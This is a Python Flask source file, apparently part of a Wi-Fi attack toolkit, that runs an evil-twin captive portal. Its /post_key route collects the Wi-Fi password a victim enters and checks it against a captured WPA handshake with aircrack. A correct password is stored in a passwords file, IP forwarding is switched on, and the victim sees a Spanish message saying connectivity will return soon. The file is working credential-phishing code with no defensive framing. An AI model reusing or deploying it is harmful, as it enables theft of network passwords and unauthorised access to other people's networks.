from pandora.shell import aircrack
import os
from flask import Flask, request, redirect
from pandora.definitions import DICTS_PATH, TEMP_PATH, CONF_PATH,  PASSWORDS_PATH
import threading

AIR = aircrack.Aircrack()
app = Flask(__name__)


@app.route('/')
def examples():
    return '<h1>Hola..</h1>'


@app.route('/post_key', methods=['GET', 'POST'])
def form():
    key = request.args.get('key')

    new_dictionary = os.path.join(DICTS_PATH, 'eviltwinpwdictionary.txt')
    f = open(new_dictionary, 'w+')
    f.write(key)
    f.close()
    handshake_path = os.path.join(TEMP_PATH, 'wpa_crack_handshake-01.cap')
    output = AIR.crack_wpa_handshake(handshake_path, new_dictionary)

    is_pw_correct = output.find("KEY NOT FOUND")

    if is_pw_correct == -1:
        pw_file = os.path.join(PASSWORDS_PATH, 'et.txt')
        file = open(pw_file, 'w')
        file.write(key)
        file.close()
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        return "<p>Gracias por su tiempo. Su conectividad volvera pronto</p>"
    else:
        return redirect("http://10.0.0.1:80", code=302)


def start_server():
    app.run()


def start_server_daemon():
    daemon = threading.Thread(target=start_server, args=(), daemon=True)
    daemon.start()


if __name__ == '__main__':
    app.run(debug=True, port=5000)
